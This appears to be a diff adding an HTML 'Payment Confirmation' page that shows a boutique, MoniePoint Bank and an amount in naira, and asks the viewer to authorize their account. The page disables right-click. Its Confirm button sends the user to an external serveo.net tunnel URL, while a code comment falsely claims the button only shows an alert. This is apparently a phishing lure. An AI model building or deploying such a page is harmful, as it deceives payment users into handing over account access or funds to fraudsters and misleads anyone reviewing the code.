@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+
+</head>
+      <center>
+    <title>Payment Confirmation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+    <style>
+        body {
+            width: 95%;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+            display: inline-block;
+            background-color: white;
+        
+        }
+        
+        h1 {
+            color: #333;
+        }
+        
+        .confirm-button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 20px;
+            margin-top: 20px;
+            cursor: pointer;
+            width: 80%;
+            height: 60px;
+            border-radius: 12px;
+            box-sizing: border-box; padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Payment Details Confirmation</h1>
+    <p>Please review your payment details before confirming and authorizing your account</p>
+    <!-- Your payment details here -->
+    <p>PAYMENT METHOD:</p>
+    <p>Shopify-Ennies collection Boutique</p>
+   <p>MoniePoint Bank</p>
+    
+    
+    <p>AMOUNT: </p>
+    <p>334786.31 NGN</p>
+    
+    
+   
+     
+     
+    
+   
+    <button class="confirm-button" onclick="confirmPayment()">Confirm</button>
+    <script>
+document.getElementsByTagName("html")[0].setAttribute("oncontextmenu","return false");
+    </script>
+    
+    <script>
+        function confirmPayment() {
+            // Add your payment confirmation logic here
+            // For this example, we'll simply display an alert
+            window.location.href = "https://quaeritur.serveo.net/paxful";
+        }
+    </script>
+</body>
+</center>
+
+</html>
